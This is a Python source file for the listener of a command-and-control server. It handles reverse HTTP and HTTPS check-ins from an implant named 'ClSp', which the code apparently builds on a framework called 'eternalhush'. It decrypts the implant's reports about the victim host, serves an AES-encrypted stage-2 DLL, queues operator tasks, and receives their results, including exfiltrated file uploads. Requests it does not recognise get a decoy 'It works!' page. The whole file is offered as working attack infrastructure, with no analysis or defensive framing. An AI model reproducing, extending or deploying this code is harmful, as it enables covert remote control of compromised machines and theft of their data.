import ssl
import sys
import sqlite3
import secrets
import eternalhush as eh
from additional.clingyspider import const, structs
import os
import json
import base64
import time
import traceback

class ReverseConnectionHandler():
    on_ready_callback = None
    nosurvey = False

    def set_on_ready_callback(self, func):
        self.on_ready_callback = func

    def generate_token(self, len):
        return secrets.token_urlsafe(16)

    def receive_NegotiationPhase(self, caller, data):
        return

    def respond_NegotiationPhase(self, caller):
        return

    def receive_Stage2Information(self, caller, data):
        return

    def respond_Stage2Information(self, caller):
        return

    def receive_Stage2Object(self, caller, data):
        return

    def respond_Stage2Object(self, caller):
        return

    def receive_FetchTask(self, caller, data):
        return

    def respond_FetchTask(self, caller):
        return

    def add_new_task(self, caller, data):
        return

    def get_task_result(self, caller, id):
        return

    def remove_task(self, caller, id):
        return

    def unknown_receive_handler(self, caller):
        return

    def unknown_respond_handler(self, caller):
        return

    def get_task_queue(self, caller):
        return

    def get_task_queue_size(self, caller):
        return

class ReverseHttpHandler(ReverseConnectionHandler):
    ENV_CONNECTION_TYPE = "reverse_http"

    def response(self, caller, data, code, cookie=None, cid= -1, opthdr = []): 
        try:
            data_len = 0
            caller.send_response(code)
            caller.send_header('Content-type', 'text/html')
            if data:
                data_len = len(data)
            caller.send_header('Content-length', str(data_len))
            if cookie:
                caller.send_header("Set-Cookie", cookie)
            if len(opthdr):
                caller.send_header(opthdr[0], opthdr[1])
            caller.end_headers()
            if data:
                caller.wfile.write(data)
            else:
                caller.wfile.write(b"")

        except ConnectionResetError:
            eh.ui.Echo("ReverseHttpHandler: cannot send data to client (ConnectionResetError)", eh.ECHO_ERROR, console_id = cid)
            return -1

        except ConnectionAbortedError:
            eh.ui.Echo("ReverseHttpHandler: cannot send data to client (ConnectionAbortedError)", eh.ECHO_ERROR, console_id = cid)
            return -1

    def create_cookie(self, caller):
        if not caller.headers['Cookie']:
            cookie = self.generate_token(16)
            return "session="+cookie

    def unknown_receive_handler(self, caller):
        self.response(caller, caller, b"<html><body><h1>It works!</h1><p>This is the default web page for this server.</p><p>The web server software is running but no content has been added, yet.</p></body></html>", 200)

    def respond_NegotiationPhase(self, caller):
        eh.ui.Echo("Called GET HELLO RESPONSE handler", eh.ECHO_DEFAULT, console_id = -1)

        hello_request = eh.data.Struct(structs.HELLO_REQUEST)

        eh.ui.Echo("STAGE 1 - Negotiation", eh.ECHO_WARNING, console_id=eh.ui.GetAvailableConsole())
        hello_request.val1 = const.MAGIC_VAL1
        hello_request.val2 = const.MAGIC_VAL2
        hello_request.inital_data = bytearray(os.urandom(248))
        
        self.response(caller, hello_request.data(), 200, cookie=self.create_cookie(caller), cid = eh.ui.GetAvailableConsole())

    def respond_Stage2Information(self, caller):
        eh.ui.Echo("Called GET STAGE2 INFO handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']

        key = caller.session_list[cookie]['key']
        iv = caller.session_list[cookie]['iv']
        cid = caller.session_list[cookie]['console_id']
        caller.session_list[cookie]['watchdog'].start()

        try:
            with open(os.path.join(eh.FILEDIR, eh.ui.GetEnv("PLATFORM_ARCH", console_id=cid)+"_ClSp_Base_Dll.dll"), "rb") as f:
                content = f.read()
                content = bytearray(content)
        except IOError:
            eh.ui.Echo("Error while opening the file ("+os.path.join(eh.FILEDIR, eh.ui.GetEnv("PLATFORM_ARCH", console_id=cid)+"_ClSp_Base_Dll.dll")+")", eh.ECHO_ERROR, console_id=session_list[cookie]['console_id'])
            return   
            
        
        plinfo = eh.data.Struct(structs.PAYLOADINFO)
        plinfo.payload_size = len(content)
        
        encrypted_payload_info = eh.crypto.EncryptAesData(key, iv, plinfo.data())
        
        self.response(caller, encrypted_payload_info, 200, cid= cid)

    def respond_Stage2Object(self, caller):
        eh.ui.Echo("Called LOAD STAGE2 handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        key = caller.session_list[cookie]['key']
        iv = caller.session_list[cookie]['iv']
        cid = caller.session_list[cookie]['console_id']
        caller.session_list[cookie]['watchdog'].start()

        try:
            with open(os.path.join(eh.FILEDIR, eh.ui.GetEnv("PLATFORM_ARCH", console_id=cid)+"_ClSp_Base_Dll.dll"), "rb") as f:
                content = f.read()
                content = bytearray(content)
        except IOError:
            eh.ui.Echo("Error while opening the file ("+os.path.join(eh.FILEDIR, eh.ui.GetEnv("PLATFORM_ARCH", console_id=cid)+"_ClSp_Base_Dll.dll")+")", eh.ECHO_ERROR, console_id=session_list[cookie]['console_id'])
            return   
                
        encrypted_content = eh.crypto.EncryptAesData(key, iv, content)

        self.response(caller, encrypted_content, 200, cid= cid)
        caller.task_list[cookie] = dict()

    def respond_FetchTask(self, caller):
        eh.ui.Echo("Called GET TASK handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        #task_rid = caller.headers['Age']
        def all_tasks_processed():
            for k in caller.task_list[cookie].keys():
                task_obj = caller.task_list[cookie][k]
                if task_obj['status'] == const.STATUS_INITAL:
                    return False
            return True
        try:
            cid = caller.session_list[cookie]['console_id']
            caller.session_list[cookie]['watchdog'].start()
            #eh.ui.Echo("Called GET TASK handler", eh.ECHO_DEFAULT, console_id = cid)
            i = 0
            get_task_to = int(eh.ui.GetEnv("CLSP_GET_TASK_TIMEOUT", console_id = cid))
            while not len(caller.task_list[cookie]) or all_tasks_processed():
                i+=1
                time.sleep(0.1)
                if i == get_task_to*10:
                #    eh.ui.Echo("GET TASK: timeout exceed, sending 0 data", eh.ECHO_DEFAULT, console_id = cid)
                    self.response(caller, b"\x00"*16, 200, cid= cid)
                    return
            else:
                task_rid = 0
                for k in caller.task_list[cookie].keys():
                    task_obj = caller.task_list[cookie][k]
                    if task_obj['status'] == const.STATUS_INITAL:
                        task_rid = k
                        break
                task_obj = caller.task_list[cookie][task_rid]    
                task_obj['status'] = const.STATUS_POSTINITAL
                data = base64.b64decode(bytes(task_obj['data'], encoding='utf8'))
                caller.task_list[cookie][task_rid] = task_obj
            #     eh.ui.Echo("GET TASK: sending task", eh.ECHO_DEFAULT, console_id = cid)
                self.response(caller, data, 200, cid= cid)
                return
        except ImportError as e:
            print("exc while fetchtask", e, traceback.format_tb(e.__traceback__))
            self.response(caller, None, 200, cid= cid)

    def get_task_result(self, caller, id):
        eh.ui.Echo("Called GET TASK RESULT handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        task_rid = int(caller.headers['task_rid'], 10)
        cid = caller.session_list[cookie]['console_id']
        i = 0
        task_result_to = int(eh.ui.GetEnv("CLSP_TASK_RESULT_TIMEOUT", console_id = cid))
        while len(caller.task_list[cookie]) and caller.task_list[cookie][task_rid]['status'] != const.STATUS_POSTED:
            i+=1
            time.sleep(0.1)
            if i == task_result_to*10:
                break
        try:
            task_obj = caller.task_list[cookie].pop(task_rid)
            data = task_obj['response']
            if data == 0:
                data = b''
            task_obj['response'] = base64.b64encode(data).decode("utf-8")
            self.response(caller, base64.b64encode(json.dumps(task_obj).encode()), 200, cid= cid)
        except Exception as e:
            #print(e, traceback.format_tb(e.__traceback__))
            self.response(caller, None, 400, cid= cid)

    def remove_task(self, caller, id):
        eh.ui.Echo("Called GET REMOVE TASK handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        task_rid = int(caller.headers['task_rid'], 10)
        cid = caller.session_list[cookie]['console_id']
        if len(caller.task_list[cookie]):
            caller.task_list[cookie].pop(task_rid)
            self.response(caller, None, 200, cid= cid)
        else:
            self.response(caller, None, 400, cid = cid)

    def add_new_task(self, caller, data):
        cookie = caller.headers['Cookie']
        task_rid = int(caller.headers['task_rid'], 10)
        cid = caller.session_list[cookie]['console_id']
        eh.ui.Echo("Called CREATE TASK handler", eh.ECHO_DEFAULT, console_id = -1)
        task_obj = json.loads(data)
        task_obj['status'] = const.STATUS_INITAL
        caller.task_list[task_obj["session_id"]][task_rid] = task_obj
        #caller.task_list[task_obj["session_id"]][task_rid] = task_obj
        self.response(caller, None, 200, cid=cid)

    def read_rsa_key(self, key_path):
        keyset = eh.ui.QueryKeyStorage()
        for ke in keyset:
            if ke['name'] == key_path:
                if ke['type'] != eh.KEYTYPE_KEYPAIR or ke['algorithm'].lower() != "rsa2048":
                    eh.ui.Echo(f"Key '{key_path}' is not valid RSA2048 keypair", eh.ECHO_ERROR)
                    return
                public_key = bytes.fromhex(ke['data2'])
                return public_key
        eh.ui.Echo(f"Key '{key_path}' not exists in keystorage", eh.ECHO_ERROR)

    def receive_NegotiationPhase(self, caller, post_data):
        eh.ui.Echo("Called HELLO handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        hello_response = eh.data.Struct(structs.HELLO_RESPONSE)
        if len(post_data) != len(hello_response):
            eh.ui.Echo("Invalid data received", eh.ECHO_ERROR, console_id=eh.ui.GetAvailableConsole())
            return
        eh.ui.Echo("Received Hello response", eh.ECHO_DEFAULT, console_id=eh.ui.GetAvailableConsole())
        hello_response.from_bytes(post_data)
        eh.ui.Echo(f"Decrypting implant info with privatekey '{caller.key_path}'", eh.ECHO_DEFAULT, console_id=eh.ui.GetAvailableConsole())
        #eh.ui.Echo(caller.key_path, eh.ECHO_DEFAULT, console_id=eh.ui.GetAvailableConsole())
        key = eh.crypto.ImportRsaKey(self.read_rsa_key(caller.key_path), eh.PRIVATE_KEY)
        if not key:
            eh.ui.Echo("Invalid RSA private key specified", eh.ECHO_ERROR, console_id=eh.ui.GetAvailableConsole())
            return
        decrypted_implant_info = eh.crypto.DecryptRsaData(key, hello_response.implant_info.get())

        implant_info = eh.data.Struct(structs.IMPLANT_INFO)
        implant_info.from_bytes(decrypted_implant_info)
    
        caller.session_list[cookie] = {}
        available_cid = eh.ui.GetAvailableConsole()
        caller.session_list[cookie]['console_id'] = available_cid
        caller.session_list[cookie]['watchdog'] = eh.utils.Timer()
        caller.session_list[cookie]['watchdog'].start()
        
        eh.ui.SetHostname(caller.address_string(), console_id=available_cid)
        eh.ui.LockModule("clsp", console_id=available_cid)
        
        eh.ui.SetEnv("CLSP_TASK_RESULT_TIMEOUT", 15, console_id=available_cid)
        eh.ui.SetEnv("CLSP_GET_TASK_TIMEOUT", 60, console_id=available_cid)

        eh.ui.Echo("Implant version: " + implant_info.implant_version.get()[::-1].hex(), eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_VERSION", implant_info.implant_version.get()[::-1].hex(), console_id=available_cid)            
        
        eh.ui.Echo("Implant session: " + cookie, eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_SESSION", cookie, console_id=available_cid)

        eh.ui.Echo("Implant id: " +  str(int.from_bytes(implant_info.implant_id.get(), "little")), eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_ID", str(int.from_bytes(implant_info.implant_id.get(), "little")), console_id=available_cid)
        
        eh.ui.Echo("Implant session key: " + implant_info.session_key.get().hex(), eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_KEY", implant_info.session_key.get().hex(), console_id=available_cid)
        caller.session_list[cookie]['key'] = implant_info.session_key.get().hex()

        eh.ui.Echo("IV key: " + hello_response.next_iv.get().hex(), eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_IV", hello_response.next_iv.get().hex(), console_id=available_cid)
        caller.session_list[cookie]['iv'] = hello_response.next_iv.get().hex()
        
        if(int.from_bytes(implant_info.implant_arch.get(), "little") == const.X64_ARCH):
            eh.ui.Echo("Implant architecture: X64", eh.ECHO_DEFAULT, console_id=available_cid)
            eh.ui.SetEnv("CLSP_ARCH", "X64", console_id=available_cid)
        else:
            eh.ui.Echo("Implant architecture: X32", eh.ECHO_DEFAULT, console_id=available_cid)
            eh.ui.SetEnv("CLSP_ARCH", "X32", console_id=available_cid)
            
        if(int.from_bytes(implant_info.platform_arch.get(), "little") == const.X64_ARCH):
            eh.ui.Echo("Platform architecture: X64", eh.ECHO_DEFAULT, console_id=available_cid)
            eh.ui.SetEnv("PLATFORM_ARCH", "X64", console_id=available_cid)
        else:
            eh.ui.Echo("Platform architecture: X32", eh.ECHO_DEFAULT, console_id=available_cid)
            eh.ui.SetEnv("PLATFORM_ARCH", "X32", console_id=available_cid)
        eh.ui.Echo("Implant platform: " + implant_info.implant_platform.get().hex(), eh.ECHO_DEFAULT, console_id=available_cid)
        
        nt_major = implant_info.nt_major.get(int)
        nt_minor = implant_info.nt_minor.get(int)
        build_major = implant_info.buildno_major.get(int)
        build_minor = implant_info.buildno_minor.get(int)
        eh.ui.Echo("NT VERSION: {}.{} {}.{}".format(nt_major, nt_minor, build_major, build_minor), eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("NTOS_MAJOR", nt_major, console_id=available_cid)
        eh.ui.SetEnv("NTOS_MINOR", nt_minor, console_id=available_cid)
        eh.ui.SetEnv("BUILDNO_MAJOR", build_major, console_id=available_cid)
        eh.ui.SetEnv("BUILDNO_MINOR", build_minor, console_id=available_cid)

        eh.ui.Echo(f"Process ID: {str(implant_info.current_pid.get(int))}", eh.ECHO_DEFAULT, console_id=available_cid)
        eh.ui.SetEnv("CLSP_PROCESS_ID", str(implant_info.current_pid.get(int)), console_id=available_cid)

        eh.ui.SetEnv("HTTP_LISTENER_PORT", str(caller.http_port), console_id=available_cid)
        caller.db_worker.update_db(cookie, caller.session_list[cookie]['key'], caller.session_list[cookie]['iv'], available_cid, caller.session_list[cookie]['watchdog'].time())
        
        eh.ui.SetEnv("CLSP_CONNECTION_TYPE", self.ENV_CONNECTION_TYPE, console_id=available_cid)

        if self.nosurvey:
            eh.ui.SetEnv("CLSP_SURVEY_RUN", "false", console_id=available_cid)
        else:
            eh.ui.SetEnv("CLSP_SURVEY_RUN", "true", console_id=available_cid)
        self.response(caller, None, 200, cid = available_cid)
        #old_cid = eh.CONSOLE_ID
        #eh.ui.UseConsoleContext(available_cid)
        self.on_ready_callback(available_cid)
        #eh.ui.UseConsoleContext(old_cid)
        


    def receive_FetchTask(self, caller, post_data):
        eh.ui.Echo("Called POST TASK RESULT handler", eh.ECHO_DEFAULT, console_id = -1)
        cookie = caller.headers['Cookie']
        key = caller.session_list[cookie]['key']
        iv = caller.session_list[cookie]['iv']
        cid = caller.session_list[cookie]['console_id']
        task_rid = int(caller.headers['Age'], 10)

        caller.session_list[cookie]['watchdog'].start()
        
        if not len(caller.task_list[cookie]):
            self.response(caller, None, 400, cid= cid)
            return
        
        task_obj = caller.task_list[cookie][task_rid]
        if caller.headers['Transfer-Encoding'] == "chunked":
            #print(f'task {task_rid} response chunked')
            line = caller.rfile.readline().strip()
            chunk_length = int(line, 10)
            chunk = caller.rfile.read(chunk_length)
            first_info_chunk = eh.crypto.DecryptAesData(key, iv, chunk)
            file_size = int.from_bytes(first_info_chunk[5:13], "big")
            file_content = b""
            while True:
                line = caller.rfile.readline().strip()
                chunk_length = int(line, 10)
                if chunk_length != 0:
                    chunk = caller.rfile.read(chunk_length)
                    file_content+=chunk
                   # print('chunk size ' + str(chunk_length))

                if chunk_length == 0:
                    break
            post_data = first_info_chunk[:13] + eh.crypto.DecryptAesData(key, iv, file_content)
            post_data = eh.crypto.EncryptAesData(key, iv, post_data)
        
        task_obj['response'] = post_data
        task_obj['status'] = const.STATUS_POSTED
       # print(f'task {task_rid} STATUS_POSTED')
        caller.task_list[cookie][task_rid] = task_obj

        self.response(caller, None, 200, cid=cid)

    def unknown_receive_handler(self, caller):
        cookie = caller.headers['Cookie']
        self.response(caller, None, 400, cid = caller.session_list[cookie]['console_id'])

class SslReverseHttpHandler(ReverseHttpHandler):
    ENV_CONNECTION_TYPE = "reverse_http_ssl"

    def response(self, caller, data, code, cookie=None, cid= -1): 
        try:
            data_len = 0
            caller.send_response(code)
            caller.send_header('Content-type', 'text/html')
            if data:
                data_len = len(data)
            caller.send_header('Content-length', str(data_len))
            if cookie:
                caller.send_header("Set-Cookie", cookie)
            caller.end_headers()
            if data:
                caller.wfile.write(data)
            else:
                caller.wfile.write(b"")

        except ConnectionResetError:
            eh.ui.Echo("SslReverseHttpHandler: cannot send data to client (ConnectionResetError)", eh.ECHO_ERROR, console_id = cid)
            return -1

        except ConnectionAbortedError:
            eh.ui.Echo("SslReverseHttpHandler: cannot send data to client (ConnectionAbortedError)", eh.ECHO_ERROR, console_id = cid)
            return -1